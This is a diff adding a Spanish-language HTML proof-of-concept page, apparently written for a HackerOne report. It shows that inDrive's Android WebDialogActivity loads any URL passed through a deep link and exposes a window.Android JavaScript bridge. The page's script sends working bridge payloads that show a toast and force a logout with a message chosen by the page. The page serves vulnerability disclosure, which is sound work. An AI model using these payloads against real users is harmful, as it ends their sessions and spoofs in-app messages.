@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>inDrive WebView Bridge PoC</title>
+<style>
+  :root {
+    --bg: #0e1210;
+    --panel: #171d1a;
+    --panel-border: #2a332d;
+    --accent: #b6f000;
+    --accent-dark: #8fbf00;
+    --text: #eef2ee;
+    --text-dim: #a3aca5;
+    --danger: #ff5b5b;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    line-height: 1.5;
+  }
+  .banner {
+    background: var(--danger);
+    color: #1a0000;
+    text-align: center;
+    font-weight: 700;
+    padding: 10px 16px;
+    font-size: 14px;
+    letter-spacing: 0.02em;
+  }
+  header {
+    padding: 32px 20px 20px;
+    text-align: center;
+  }
+  .logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 26px;
+    font-weight: 800;
+    color: var(--accent);
+  }
+  .logo .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--accent); }
+  header p.subtitle {
+    color: var(--text-dim);
+    margin-top: 6px;
+    font-size: 14px;
+  }
+  main {
+    max-width: 640px;
+    margin: 0 auto;
+    padding: 0 20px 60px;
+  }
+  section.card {
+    background: var(--panel);
+    border: 1px solid var(--panel-border);
+    border-radius: 16px;
+    padding: 22px;
+    margin-bottom: 20px;
+  }
+  h2 {
+    margin: 0 0 10px;
+    font-size: 17px;
+    color: var(--accent);
+  }
+  p { color: var(--text-dim); font-size: 14px; margin: 6px 0; }
+  code {
+    background: #0a0d0b;
+    border: 1px solid var(--panel-border);
+    border-radius: 6px;
+    padding: 2px 6px;
+    font-size: 12.5px;
+    color: var(--accent);
+  }
+  .action-block {
+    background: var(--panel);
+    border: 1px solid var(--panel-border);
+    border-radius: 16px;
+    padding: 22px;
+    margin-bottom: 20px;
+  }
+  .action-block h3 {
+    margin: 0 0 4px;
+    font-size: 16px;
+  }
+  .action-block .desc {
+    font-size: 13.5px;
+    color: var(--text-dim);
+    margin-bottom: 14px;
+  }
+  button.action-btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: 999px;
+    border: none;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    background: var(--accent);
+    color: #10150f;
+  }
+  button.action-btn:active { background: var(--accent-dark); }
+  button.action-btn.danger { background: var(--danger); color: #1a0000; }
+  .why {
+    margin-top: 14px;
+    padding-top: 14px;
+    border-top: 1px dashed var(--panel-border);
+    font-size: 13px;
+  }
+  .why b { color: var(--text); }
+  #log {
+    background: #0a0d0b;
+    border: 1px solid var(--panel-border);
+    border-radius: 12px;
+    padding: 14px;
+    font-family: "SF Mono", Consolas, monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    white-space: pre-wrap;
+    word-break: break-all;
+    min-height: 60px;
+  }
+  footer {
+    text-align: center;
+    color: var(--text-dim);
+    font-size: 12px;
+    padding: 20px;
+  }
+</style>
+</head>
+<body>
+
+<div class="banner">
+  PRUEBA DE CONCEPTO DE SEGURIDAD — NO ES UNA PAGINA OFICIAL DE INDRIVE — INVESTIGACION AUTORIZADA (HACKERONE)
+</div>
+
+<header>
+  <div class="logo"><span class="dot"></span> inDrive WebView Bridge — Test</div>
+  <p class="subtitle">Prueba de concepto para el hallazgo de seguridad reportado en HackerOne</p>
+</header>
+
+<main>
+
+  <section class="card">
+    <h2>Que es esto</h2>
+    <p>La app de inDrive para Android tiene una pantalla (<code>WebDialogActivity</code>) que se puede abrir desde cualquier link (<code>indrive://webdialog?url=...</code>), incluso si el link viene de una pagina que no es de inDrive.</p>
+    <p>Esa pantalla carga la URL que le pases <b>sin revisar si es un dominio de inDrive o no</b>, y le conecta un puente de JavaScript (<code>window.Android</code>) que permite ejecutar acciones internas de la app.</p>
+    <p>En otras palabras: esta misma pagina, con solo un toque en un link, puede hablarle directamente a funciones internas de tu app de inDrive.</p>
+  </section>
+
+  <section class="card">
+    <h2>Como funciona la prueba</h2>
+    <p>Cada boton de abajo llama a <code>window.Android.postMessage(...)</code> con una accion distinta del bridge. Son las mismas acciones que la app real usa internamente — la diferencia es que esta pagina no es de inDrive.</p>
+  </section>
+
+  <div class="action-block">
+    <h3>🔔 TOAST</h3>
+    <div class="desc">Muestra un mensaje nativo de Android, generado por la app, con el texto que esta pagina eligio.</div>
+    <button class="action-btn" onclick="sendToast()">Probar TOAST</button>
+    <div class="why">
+      <b>Que demuestra:</b> que el bridge esta activo y responde a comandos de una pagina no confiable. Si ves el mensaje, la app ejecuto codigo nativo pedido por esta pagina, no por inDrive.
+    </div>
+  </div>
+
+  <div class="action-block">
+    <h3>🚪 LOGOUT FORZADO</h3>
+    <div class="desc">Cierra tu sesion de inDrive de inmediato, sin pedir confirmacion, usando un mensaje que esta pagina define.</div>
+    <button class="action-btn danger" onclick="sendLogout()">Probar LOGOUT (te va a desloguear)</button>
+    <div class="why">
+      <b>Que demuestra:</b> impacto real. Cualquier persona que reciba este link y lo toque una vez pierde su sesion activa, sin aviso previo ni forma de evitarlo. El texto que aparece en pantalla es el mismo que se ve abajo en "mensaje enviado" — si coincide, confirma que la app mostro exactamente lo que esta pagina le mando.
+    </div>
+  </div>
+
+  <section class="card">
+    <h2>Registro</h2>
+    <div id="log">Esperando...</div>
+  </section>
+
+</main>
+
+<footer>PoC de investigacion de seguridad — inDrive HackerOne program</footer>
+
+<script>
+  const logEl = document.getElementById('log');
+  function log(msg) {
+    logEl.textContent += "\n" + msg;
+  }
+
+  log("Pagina cargada. Host: " + window.location.href);
+  log("window.Android disponible: " + (!!(window.Android && window.Android.postMessage)));
+
+  function sendToast() {
+    const ts = new Date().toISOString();
+    const payload = {
+      action: "toast",
+      data: { text: "PoC bridge test " + ts }
+    };
+    log("-> enviando TOAST: " + JSON.stringify(payload));
+    if (window.Android && window.Android.postMessage) {
+      window.Android.postMessage(JSON.stringify(payload));
+    } else {
+      log("window.Android no disponible (no estas dentro de la app)");
+    }
+  }
+
+  function sendLogout() {
+    const ts = new Date().toISOString();
+    const uniqueMsg = "PoC-inDrive-" + ts + " - esto no es un mensaje real de seguridad, es una prueba autorizada de HackerOne";
+    const payload = {
+      action: "logout_with_message",
+      data: { message: uniqueMsg }
+    };
+    log("-> mensaje enviado: " + uniqueMsg);
+    log("-> enviando LOGOUT: " + JSON.stringify(payload));
+    if (window.Android && window.Android.postMessage) {
+      window.Android.postMessage(JSON.stringify(payload));
+    } else {
+      log("window.Android no disponible (no estas dentro de la app)");
+    }
+  }
+
+  window.callWebView = function(raw) {
+    log("<- respuesta app: " + JSON.stringify(raw));
+  };
+</script>
+
+</body>
+</html>
